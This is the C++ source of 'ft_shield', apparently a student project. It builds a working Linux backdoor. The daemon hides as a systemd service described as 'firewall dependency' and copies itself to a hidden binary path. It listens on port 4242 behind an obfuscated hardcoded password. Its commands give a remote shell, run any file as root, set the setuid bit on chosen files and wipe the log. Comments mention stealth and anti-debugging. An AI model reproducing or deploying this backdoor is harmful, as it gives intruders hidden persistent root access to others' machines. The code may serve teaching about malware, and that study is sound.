/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Ft_Shield.cpp                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: halvarez <halvarez@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/10/23 16:44:39 by halvarez          #+#    #+#             */
/*   Updated: 2023/11/20 18:39:34 by halvarez         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <iostream>
#include <fstream>
#include <string>
#include <csignal>

#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <arpa/inet.h>

#include "Ft_Shield.hpp"

#define EXIT_SUCCESS 0
#define EXIT_FAILURE 1

/*
 * SIGPIPE handler:
 * Ignore broken pipe signal to avoid crash if ft_shield sends a message to
 * a cliant that is dosconnected
 */
void	brokenPipe(int signal __attribute__((unused)))
{
	return;
}
/* Constructors ============================================================= */
Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2), _lockFile(-1), _logFile(-1), _nClients(0)
{
	sockaddr_in	&addrIn	= *reinterpret_cast<sockaddr_in *>(&this->_addr);

	/* Define the server parameters */
	addrIn.sin_family = AF_INET;
	addrIn.sin_addr.s_addr = inet_addr("127.147.6.1");//INADDR_ANY to permit any local ipv4
	addrIn.sin_port = htons(this->_port);

	/* Map the commands into the command-mapper t_commands */
	this->_cmdMap["shutdown\n"]	= &Ft_Shield::_shutdown;
	this->_cmdMap["rev\n"]		= &Ft_Shield::_reverseShell;
	this->_cmdMap["quit\n"]		= &Ft_Shield::_disconnect;
	this->_cmdMap["help\n"]		= &Ft_Shield::_help;
	this->_cmdMap["elfAsRoot\n"]= &Ft_Shield::_elfAsRoot;
	this->_cmdMap["rootLike\n"]	= &Ft_Shield::_rootLike;
	this->_cmdMap["clean log\n"]= &Ft_Shield::_cleanLog;
	return;
}

/*
 * Unused and useless, just here to have the Copernic form
 */
Ft_Shield::Ft_Shield(const Ft_Shield &shield) : _port(shield._port), _MaxClients(shield._MaxClients)
{
	return;
}

/* Destructor =============================================================== */
/*
 * Close all fd > 2
 * Delete the DAEMON_LOCK_FILE
 * Preserve the log file
 */
Ft_Shield::~Ft_Shield(void)
{
	this->_buffer = "You've been disconnected.\n";
	for (int fd = 3; fd <= this->_maxfd; fd++)
	{
		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
		close(fd);
	}
	remove(DAEMON_LOCK_FILE);
	return;
}

/* Operators ================================================================ */
/*
 * Unused and useless, just here to have the Copernic form
 */
Ft_Shield & Ft_Shield::operator=(const Ft_Shield & shield __attribute__((unused)))
{
	return *this;
}

/* Public member functions ================================================== */
/*
 * Two forks to detach from current process and from terminal
 * Check if another instance is running
 * Init and run the server
 */
void Ft_Shield::daemonize(void)
{
	int	pid		= 0;
	//char buf[9] = {'\0'};

	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
	std::signal(SIGPIPE, &brokenPipe);
	/* First fork to detach from the current processus */
	pid = fork();
	if (pid == -1)
		exit(EXIT_FAILURE);
	else if (pid > 0)
		exit(EXIT_SUCCESS);
	else if (pid == 0)
	{
		/* Create a new session */
		setsid();
		/* Second fork to detach from terminal */
		pid = fork();
		if (pid == -1)
			exit(EXIT_FAILURE);
		else if (pid > 0)
			exit(EXIT_SUCCESS);
		else if (pid == 0)
			this->start();
	}
	return;
}

void	Ft_Shield::start(void)
{
	char buf[9] = {'\0'};

	/* Set default permisions */
	umask(0000);
	/* Open the log file and indentify the beginning of this instance */
	this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
	if (this->_logFile != -1)
	{
		write(this->_logFile, "New log instance:\n", 18);
		this->_maxfd++;
	}
	/* 
	 * Create a lock file
	 * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL
	 * Fail if another instance of ft_shield is running
	 */
	//this->_checkInstance();
	this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
	if (this->_run == true && this->_lockFile != -1)
	{
		this->_maxfd++;
		/* Write the daemon pid in the lock file */
		sprintf(buf, "%d\n", getpid());
		write(this->_lockFile, buf, strlen(buf));
		/* _mkSrv returns -1 on error, 0 otherwise */
		 if (this->_mkSrv() != -1)
			 this->_runSrv();
	}
	return;
}

/*
 * Copy the ft_shield executable in /usr/local/bin/.ft_shield
 * Create a service entry in systemctl to run the program at startup
 */
void	Ft_Shield::setup(char const *me)
{
	std::ofstream	service(INIT_FILE, std::ios::binary);

	if (service.is_open())
	{
		service << "[Unit]" << std::endl;
		service << "Description=firewall dependency" << std::endl;
		service << "[Service]" << std::endl;
		service << "ExecStart=" << COPY_ELF << " --on-boot" << std::endl;
		service << "[Install]" << std::endl;
		service << "WantedBy=multi-user.target" << std::endl;
		service.close();
		system("systemctl enable ft_shield.service --now");
	}
	this->_copy(me);
	return;
}

/* Private member functions ================================================= */
/*
 * Check if another instance is already running, quit if yes, continue otherwise
 * Check by process name instead of get a lock file : more stealth
 * NOTE:
 * 	It's a kind of antidebug code because gdb runs several times the process to debug it
 */
void	Ft_Shield::_checkInstance(void)
{
	int		fd[2];
	int		pid;
	int		count = 0;
	char	char_buf[100] = {'\0'};
	std::size_t	found = -1;

	//this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
	if (pipe(fd) != -1)
	{
			/*
			 * Check return value of ps axco | grep ft_shield
			 * Set this->_run to false if another ft_shield process is running
			 */
		pid = fork();
		if (pid == 0)
		{
			close(fd[0]);
			close(STDOUT_FILENO);
			dup2(fd[1], STDOUT_FILENO);
			system("ps axco pid,command | grep ft_shield");
			this->_exit();
		}
		else if (pid != 0)
		{
			close(fd[1]);
			waitpid(pid, NULL, 0);
			read(fd[0], char_buf, 99);
			close(fd[0]);
			this->_buffer = char_buf;
			while (this->_buffer.find("ft_shield", found+1) != std::string::npos)
			{
				count++;
				found = this->_buffer.find("ft_shield", found + 1);
			}
			if (count > 2)
				this->_exit();
		}
	}
	return;
}

/* 
 * Configure a server listening on this->_port (4242)
 *   - Do not block
 *   - Can reuse the address and the port right after closing the server
 *   - Return -1 on error and 0 otherwise
 */
int	Ft_Shield::_mkSrv(void)
{
	int	opt = 1;

	this->_socket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
	if (this->_socket == -1)
		return -1;
	this->_maxfd++;
	if (setsockopt(this->_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) == -1)
		return -1;
	if (bind(this->_socket, &this->_addr, sizeof(this->_addr)) == -1)
		return -1;
	if (listen(this->_socket, 10) == -1)
		return -1;
	return 0;
}

/*
 * Run a simple server using select api
 * Execute the client command and ignore it if it's not a legit command
 * Close the client socket if it is disconnected or sends a 'quit' string
 */
void	Ft_Shield::_runSrv(void)
{
	socklen_t	lenaddr = sizeof(this->_addr);
	int			client = -1;
	fd_set		master_set, read_set, write_set;
	char		char_buf[100] = {'\0'};
	int			res = 0;

	this->_maxfd = this->_socket;
	FD_ZERO( &master_set );
	FD_SET(this->_socket, &master_set);

	while(this->_run)
	{
		read_set = master_set;
		write_set = master_set;
		if (select(this->_maxfd + 1, &read_set, &write_set, NULL, NULL) < 0)
			continue;
		for(int fd = 0; fd <= this->_maxfd; fd++)
		{
			if (FD_ISSET(fd, &read_set) && fd == this->_socket)
			{
				client = accept(this->_socket, &this->_addr, &lenaddr);
				if (client != -1 && this->_nClients < this->_MaxClients)
				{
					FD_SET(client, &master_set);
					this->_maxfd = client > this->_maxfd ? client : this->_maxfd;
					this->_nClients++;
					send(client, "Connected to ft_shield:\n", 24, 0);
					if (this->_password(client) == -1)
						this->_disconnect(client);
					else
					{
						this->_buffer = "Password granted.\n";
						send(client, this->_buffer.c_str(), this->_buffer.length(), 0);
					}
				}
				else if (client != -1)
				{
					send(client, "Sorry, too much connexions\n", 28, 0);
					close(client);
				}
			}
			if (FD_ISSET(fd, &read_set) && fd != this->_socket)
			{
				/*
				 * if res == 0 : disconnection case
				 * MSG_PEEK permits to read data without taking them off the queue
				 */
				res = recv(fd, char_buf, 99, MSG_PEEK);
				if (res <= 0)
					this->_disconnect(fd);
				else
				{
					res = recv(fd, char_buf, 99, 0);
					this->_buffer = char_buf;
					bzero(char_buf, 100);
					if (this->_cmdMap.find(this->_buffer) != this->_cmdMap.end())
						( this->*( this->_cmdMap[this->_buffer] ) )(fd);
				}
			}
		}
	}
	return;
}

/*
 * This function exit the process if needed: another instance alreaddy running
 * Function closing all the file descriptor before exiting
 * Doesn't remove the log and lock files
 */
void	Ft_Shield::_exit(void)
{
	this->_run = false;
	for (int fd = 3; fd <= this->_maxfd; fd++)
		close(fd);

	exit(EXIT_SUCCESS);
}

/*
 * set this->_run to false and the server loop won't be launched
 */
void	Ft_Shield::_shutdown(int fd __attribute__((unused)))
{
	this->_run = false;
	return;
}

/*
 * Open a reverse shell to the client asking for it:
 *  Child process:
 *   - redirect stdin, stdout and stderr to the cliend fd
 *   - excve a shell
 *  Parent process:
 *   - Disconnect the client from ft_shield to avoid fd conflict
 */
void	Ft_Shield::_reverseShell(int fd)
{
	int		pid = -1;
	char	*shell[2];
	char	cmd[8] = "/bin/sh";
	char	*arg = NULL;

	shell[0] = cmd;
	shell[1] = arg;
	pid = fork();
	if (pid != -1 && pid == 0)
	{
		close(STDIN_FILENO);
		close(STDOUT_FILENO);
		close(STDERR_FILENO);
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		close(fd);
		if (execve(shell[0], shell, NULL) == -1)
			this->_exit();
	}
	else if (pid != -1 && pid > 0)
	{
		close(fd);
		this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
		this->_nClients--;
	}
	return;
}

/*
 * Disconnect a client closing its fd
 */
void	Ft_Shield::_disconnect(int fd)
{
	this->_buffer = "You've been disconnected.\n";
	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	close(fd);
	this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
	this->_nClients--;
	return;
}

/*
 * Simple help menu associated to the help command
 * Should be a const function but isn't for compatibility with t_commands
 */
void	Ft_Shield::_help(int fd)
{
	std::string	help;

	help = "ft_shield list of commands:\n";
	help += "\t- shutdown : terminate ft_shield and erase tracks\n";
	help += "\t- quit     : disconnect you from ft_shield\n";
	help += "\t- rev      : open a shell with root rights\n";
	help += "\t- elfAsRoot: run any file with root priviliges\n";
	help += "\t- rootLike : modify file permissions to run an elf as root by a non priviliged user\n";
	help += "\t- clean log : remove the log file and create a new one,\n"; 
	send(fd, help.c_str(), help.length(), 0);
	return;
}

/*
 * Ask for password, wait 8s
 * Calculation between values for obfuscation
 * Password: P@ylo@d42\n\0
 * The \n is due to the input in netcat
 */
int	Ft_Shield::_password(int fd) const
{
	std::string		msg = "You have 8s to enter the password:\n";
	char			char_buf[15] = {'\0'};
	int				res = 0;
	unsigned int	time = 0;

	send(fd, msg.c_str(), msg.length(), 0);
	while (res <= 0 && time < 8)
	{
		res = recv(fd, char_buf, 14, MSG_PEEK | MSG_DONTWAIT);
		sleep(1);
		time++;
	}
	res = recv(fd, char_buf, 14, MSG_DONTWAIT);
	if (res <= 0)
	{
		msg = "Sorry, time elapsed.\n";
		send(fd, msg.c_str(), msg.length(), 0);
		return -1;
	}
	else
	{
		msg = char_buf;
		if (msg[0] == 0x50 && msg[1] == msg[0] - 0x10 && msg[2] == msg[1] + 0x39)
		{
			if ((msg[4] - msg[3]) == 0x3 && msg[3] == 0x6c)
			{
				if (msg[1] == msg[5] && msg[1] + 0x24 == msg[6])
				{
					if (msg[8] == 0x32 && msg[7] == (msg[8] + 2) && (msg[9] - msg[10]) == 0xa)
					{
						if (msg[10] == 0)
							return 0;
						else
							return -1;
					}
					else
						return -1;
				}
				else
					return -1;
			}
			else
				return -1;
		}
		else
			return -1;
	}
	return 0;
}

/*
 * Run any file as root after checking the file exists 
 */
void	Ft_Shield::_elfAsRoot(int fd)
{
	int				pid = 0;
	int				res = 0;
	char			char_buf[100] = {'\0'};
	unsigned int	time = 0;
	char			*file[2];

	file[0] = char_buf;
	file[1] = NULL;
	this->_buffer = "You have 10s to enter the absolute file path:\n";
	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	while (res <= 0 && time < 10)
	{
		res = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);
		sleep(1);
		time++;
	}
	res = recv(fd, char_buf, 99, MSG_DONTWAIT);
	if (res <= 0)
	{
		this->_buffer = "Sorry, time elapsed.\n";
		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
		return;
	}
	else
	{
		char_buf[res - 1] = '\0';
		if (access(char_buf, F_OK) != -1)
		{
			pid = fork();
			if (pid != -1 && pid == 0)
			{
				if (execve(file[0], file, NULL) == -1)
				{
					this->_buffer = "Error executing the file.\n";
					send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
					this->_exit();
				}
			}
			else if (pid != -1 && pid != 0)
				this->_buffer = "Program launched.\n";
			else
				this->_buffer = "Error executing the file.\n";
		}
		else
			this->_buffer = "Error: no such file.\n";
		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	}
	return;
}

/*
 * Change the owner of the file to root
 * Set the setuid bit for the selected file
 * In other words, any unprivileged user would be able to launch the program as root
 */
void	Ft_Shield::_rootLike(int fd)
{
	int				res = 0;
	char			char_buf[100] = {'\0'};
	unsigned int	time = 0;

	this->_buffer = "You have 10s to enter the absolute file path:\n";
	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	while (res <= 0 && time < 10)
	{
		res = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);
		sleep(1);
		time++;
	}
	res = recv(fd, char_buf, 99, MSG_DONTWAIT);
	if (res <= 0)
	{
		this->_buffer = "Sorry, time elapsed.\n";
		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
		return;
	}
	else
	{
		char_buf[res - 1] = '\0';
		if (chown(char_buf, 0, 0) == 0 && chmod(char_buf, 04777) == 0)
			this->_buffer = "Setuid bit correctly set.\n";
		else
			this->_buffer = "Error: no suche file.\n";
		send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	}
	return;
}

/*
 * Copy the file to the specified location in COPY_FILE macro
 */
void	Ft_Shield::_copy(char const *me) const
{
	std::ifstream	src(me, std::ios::binary);
	std::ofstream	dst(COPY_ELF, std::ios::binary);

	dst << src.rdbuf();
	src.close();
	dst.close();
	return;
}

/*
 * Clean the log file and create a new one empty
 */
void	Ft_Shield::_cleanLog(int fd __attribute__((unused)))
{
	close(this->_logFile);
	if (remove(DAEMON_LOG_FILE) == -1)
		this->_buffer = "Deletion failed";
	else
	{
		this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
		if (this->_logFile == -1)
			this->_buffer = "Log file deleted and new one has been created.\n";
		else
			this->_buffer = "Log file deleted but creation of a new log file failed.\n";
	}
	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
	return;
}
